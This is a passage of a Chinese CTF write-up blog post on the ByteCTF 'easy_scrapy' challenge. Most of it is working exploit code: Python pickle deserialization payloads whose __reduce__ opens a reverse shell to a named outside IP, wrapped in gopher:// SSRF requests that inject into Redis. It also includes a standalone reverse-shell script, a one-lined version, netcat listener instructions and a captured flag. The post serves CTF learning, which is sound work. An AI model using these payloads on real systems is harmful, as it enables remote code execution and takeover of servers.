<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># exp1.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;120.55.50.65&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test = str(pickle.dumps(exp()))</span><br><span class="line">poc = test.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;\\n&#x27;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">poc =<span class="string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">print(poc)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将其中的 vps 地址和端口改为自己的，在自己的服务器运行 nc -lvvp 9999，将生成的 payload 在 <a target="_blank" rel="noopener" href="http://101.200.50.18:30010/result?url=http://120.55.50.65/1.html">http://101.200.50.18:30010/result?url=http://120.55.50.65/1.html</a> 的 url= 之后，即可 get shell。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/F195950B-B1C3-4F53-AEC0-E9502B8ED0AC.png"><br>最后得到 flag 为 ByteCTF{59c9c566-1167-4f66-950e-043fe53a1db5}</p>
<h2 id="拆解exp"><a href="#拆解exp" class="headerlink" title="拆解exp"></a>拆解exp</h2><p>exp 中知识盲区太多。可以考虑整理过后基础补充吧（Nnn 大佬还提供一种思路——打 redis），整理后的 exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># exp2.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            python -c  &#x27;import socket,subprocess,os;</span></span><br><span class="line"><span class="string">                        </span></span><br><span class="line"><span class="string">                        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span></span><br><span class="line"><span class="string">                        s.connect((&quot;120.55.50.65&quot;,9999));</span></span><br><span class="line"><span class="string">                        os.dup2(s.fileno(),0);</span></span><br><span class="line"><span class="string">                        os.dup2(s.fileno(),1);</span></span><br><span class="line"><span class="string">                        os.dup2(s.fileno(),2);</span></span><br><span class="line"><span class="string">                        p=subprocess.call(</span></span><br><span class="line"><span class="string">                                            [&quot;/bin/sh&quot;,&quot;-i&quot;]</span></span><br><span class="line"><span class="string">                                          );</span></span><br><span class="line"><span class="string">                        &#x27;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test = str(pickle.dumps(exp()))</span><br><span class="line">poc = test.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;\\n&#x27;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">poc =<span class="string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">print(poc)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>接下来就一点点分析这个 exp，然后自己尝试些 exp。</p>
<h3 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h3><p>我将那段 <code>__reduce__</code>中的代码在本地进行执行，测试 bash 命令的正确性。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/DF0CABC7-4537-44C8-8289-28A1F9C990A2.png"><br>从上图可以看出，经过整理后的 bash 命令不能执行，也就印证了 exp2 生成的 payload 无法反弹 shell。</p>
<p>在这里补了一下 Python 反弹 shell 的姿势。尝试使用自己的反弹 shell 脚本 反弹 shell。Python 反弹 shell 的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;120.55.50.65&quot;</span>, <span class="number">9999</span>))</span><br><span class="line">os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">p = subprocess.call(</span><br><span class="line">    [<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-i&quot;</span>]</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在 <a target="_blank" rel="noopener" href="http://www.onelinerizer.com/">one-lined python 官网</a>生成一行的 python，并合成成命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python -c &quot;(lambda __g: [[[[(s.connect((&#39;120.55.50.65&#39;, 9999)), (os.dup2(s.fileno(), 0), (os.dup2(s.fileno(), 1), (os.dup2(s.fileno(), 2), [None for __g[&#39;p&#39;] in [(subprocess.call([&#39;&#x2F;bin&#x2F;sh&#39;, &#39;-i&#39;]))]][0])[1])[1])[1])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0])(globals())&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将替换原 exp 中的 反弹 shell 脚本，得到脚本：（注意引号问题）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;python -c \&quot;(lambda __g: [[[[(s.connect((&#x27;120.55.50.65&#x27;, 9999)), (os.dup2(s.fileno(), 0), (os.dup2(s.fileno(), 1), (os.dup2(s.fileno(), 2), [None for __g[&#x27;p&#x27;] in [(subprocess.call([&#x27;/bin/sh&#x27;, &#x27;-i&#x27;]))]][0])[1])[1])[1])[1] for __g[&#x27;s&#x27;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#x27;os&#x27;] in [(__import__(&#x27;os&#x27;, __g, __g))]][0] for __g[&#x27;subprocess&#x27;] in [(__import__(&#x27;subprocess&#x27;, __g, __g))]][0] for __g[&#x27;socket&#x27;] in [(__import__(&#x27;socket&#x27;, __g, __g))]][0])(globals())\&quot;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">test = str(pickle.dumps(exp()))</span><br><span class="line">poc = test.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;\\n&#x27;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">poc =<span class="string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">print(poc)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h3><p>最后需要看懂 poc 的 前半部分，就是下面这一小块：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">gopher:&#x2F;&#x2F;172.20.0.7:6379&#x2F;_ZADD byte:requests 0 &quot;“</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在此之前先去补充了一下 gopher 和 redis 的基本用法。并且题解中提到通过观察源码可以知道 scrapy_redis 它会将request对象存入爬虫名:requests这样的有序列表中。这里我有 2 个问题：</p>
<ol>
<li>使用 gopher 协议可以向 redis 插入数据？可以在本地进行测试。</li>
<li>为什么在 result= 之后可以 SSRF？怎么进行测试？<br>使用下面的 url 在本地进行测试，确实可以获取到数据。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 插入键和值</span><br><span class="line">curl -v gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_set%20runoobkey%20redis</span><br><span class="line"># 获取值</span><br><span class="line">curl -v gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_get%20runoobkey</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<p>通过前面读取源码，可以知道 host</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">127.0.0.1     localhost</span><br><span class="line">::1           localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0       ip6-localnet</span><br><span class="line">ff00::0       ip6-mcastprefix</span><br><span class="line">ff02::1       ip6-allnodes</span><br><span class="line">ff02::2       ip6-allrouters</span><br><span class="line">172.20.0.5    914c062c7588</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>整理一下所有 ip 的思路（只看后缀）</p>
<ol>
<li>setting.py 中有一个 .7 的 ip</li>
<li>pipelines.py 中有一个 .8 的 ip</li>
<li>host 中有 .5 的 ip<br>每个 ip 都对应一个 redis，参考这篇文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/zwq912318834/article/details/78854571">https://blog.csdn.net/zwq912318834/article/details/78854571</a> 可知，存在主从 redis。如何判断 主服务器的地址呢？为啥开始 exp 打 .7 的 ip 呢？</li>
</ol>
<p>这个题目已经补完了！最重要的思想已经 GET，每次补题都会补题时间过长。。导致很多题目没补完，这次也是。(还有可能是比较菜的原因-。-#)</p>
<hr>
<p>官方已经将环境关闭了，额，补不完了。</p>
      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/276016d77f60/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime" title="更新时间"></i>
              2020-10-25 09:22:59
            </span>
            
                  <span class="post-categories">
                    <i class="iconfont icon-bookmark" title="分类"></i>
                    
                    <span class="span--category">
                      <a href="/categories/CTF/" title="CTF">
                        <b>#</b> CTF
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/3ac02a0dcee2/" target="_self">
                <span>下一页</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-scrapy"><span class="toc-text">easy_scrapy</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-text">读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">Python反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%86%E8%A7%A3exp"><span class="toc-text">拆解exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">python反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher%E5%8D%8F%E8%AE%AE"><span class="toc-text">gopher协议</span></a></li></ol></li></ol></li></ol>
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        


  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>

  <div id="vcomments"></div>

  <script>
    new Valine({
      el: '#vcomments',
      appId: 'ikvSzWGgS2Gj6eMcU18rNJ0T-gzGzoHsz',
      appKey: '8JFk6edtiIlTX0CcOOnneFWO',
      placeholder: 'Welcome!',
      avatar: 'retro',
      lang: 'zh-CN'
    })
  </script>




      </div>
    
  </div>


        <div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/slug01sh">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
        <li>
          <a title="email" href="mailto:slug01sh@gmail.com">
            <i class="iconfont icon-envelope"></i>
          </a>
        </li>
      
        <li>
          <a title="rss" href="/atom.xml">
            <i class="iconfont icon-rss"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © Oranges 2021</a>
        
    </div>
  
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
</div>

      </div>

      <div class="back-to-top hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



      
  <div class="search-icon" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




    </div>
  </body>
</html>
